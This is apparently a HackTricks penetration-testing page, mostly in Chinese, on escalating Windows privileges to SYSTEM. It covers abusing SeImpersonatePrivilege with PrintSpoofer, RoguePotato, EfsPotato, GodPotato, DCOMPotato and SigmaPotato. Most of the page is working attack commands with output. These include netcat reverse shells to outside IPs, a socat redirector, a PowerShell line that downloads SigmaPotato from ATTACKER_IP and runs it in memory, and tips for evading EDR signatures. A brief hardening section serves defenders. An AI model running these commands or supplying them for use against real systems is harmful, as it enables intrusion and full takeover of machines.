# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato 不再适用** 于 Windows Server 2019 和 Windows 10 build 1809 及更高版本。 然而，[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 可用于 **利用相同特权并获取 `NT AUTHORITY\SYSTEM`** 级别的访问权限。 这篇 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 对 `PrintSpoofer` 工具进行了深入介绍，该工具可用于在 JuicyPotato 不再适用的 Windows 10 和 Server 2019 主机上滥用 impersonation 权限。

> [!TIP]
> 一个在 2024–2025 年间经常维护的现代替代方案是 SigmaPotato（GodPotato 的 fork），它增加了内存/.NET 反射的使用并扩展了对操作系统的支持。见下面的快速用法及参考中的仓库。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要求和常见注意事项

以下所有技术都依赖于从持有以下任一权限的上下文滥用具有 impersonation 能力的特权服务：

- SeImpersonatePrivilege (最常见) 或 SeAssignPrimaryTokenPrivilege
- 如果 token 已经具有 SeImpersonatePrivilege（许多服务账户例如 IIS AppPool、MSSQL 等通常如此），则不需要高完整性（High integrity）。

快速检查权限：
```cmd
whoami /priv | findstr /i impersonate
```
操作说明：

- 如果你的 shell 在一个受限令牌下运行且缺少 SeImpersonatePrivilege（在某些情况下 Local Service/Network Service 常见），使用 FullPowers 恢复该账户的默认权限，然后运行一个 Potato。示例：`FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer 需要 Print Spooler 服务运行并且可以通过本地 RPC 端点 (spoolss) 访问。在经过加固且在 PrintNightmare 后禁用 Spooler 的环境中，优先使用 RoguePotato/GodPotato/DCOMPotato/EfsPotato。
- RoguePotato 需要一个可通过 TCP/135 访问的 OXID resolver。如果出站被阻断，使用重定向器/端口转发器（见下面示例）。旧版本构建需要 -f 标志。
- EfsPotato/SharpEfsPotato 利用 MS-EFSR；如果某个 pipe 被阻塞，尝试替代 pipe（lsarpc、efsrpc、samr、lsass、netlogon）。
- 在 RpcBindingSetAuthInfo 期间出现错误 0x6d3 通常表示未知/不支持的 RPC 身份验证服务；尝试不同的 pipe/传输，或确保目标服务正在运行。

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意：
- 你可以使用 -i 在当前控制台启动一个交互式进程，或使用 -c 运行一行命令。
- 需要 Spooler 服务。如果被禁用，将会失败。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
如果出站 135 被阻止，请在你的 redirector 上通过 socat 转发 OXID resolver：
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
提示：如果一个 pipe 失败或被 EDR 阻止，尝试其他受支持的 pipes：
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注意：
- 当存在 SeImpersonatePrivilege 时，适用于 Windows 8/8.1–11 以及 Server 2012–2022。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供两种变体，针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象。构建或使用提供的 binaries 并运行你的命令：
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新的 GodPotato fork)

SigmaPotato 添加了现代化的便利功能，例如通过 .NET reflection 的 in-memory execution，以及一个 PowerShell reverse shell 辅助工具。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 检测与加固说明

- 监控创建 named pipes 并立即调用 token-duplication APIs、随后调用 CreateProcessAsUser/CreateProcessWithTokenW 的进程。Sysmon 可暴露有用的遥测：Event ID 1 (process creation)、17/18 (named pipe created/connected)，以及以 SYSTEM 身份生成子进程的命令行。
- Spooler 加固：在不需要的服务器上禁用 Print Spooler 服务，可防止通过 spoolss 发生类似 PrintSpoofer 的本地强制提升。
- 服务账户加固：尽量减少向自定义服务分配 SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege。考虑使用最低权限的虚拟账户运行服务，并在可能时通过 service SID 和 write-restricted tokens 对其进行隔离。
- 网络控制：阻止出站 TCP/135 或限制 RPC endpoint mapper 流量可以破坏 RoguePotato，除非存在内部重定向器。
- EDR/AV：这些工具通常都有广泛的签名检测。通过从源码重新编译、重命名符号/字符串或使用 in-memory execution 可以降低检测概率，但无法绕过稳健的行为检测。

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
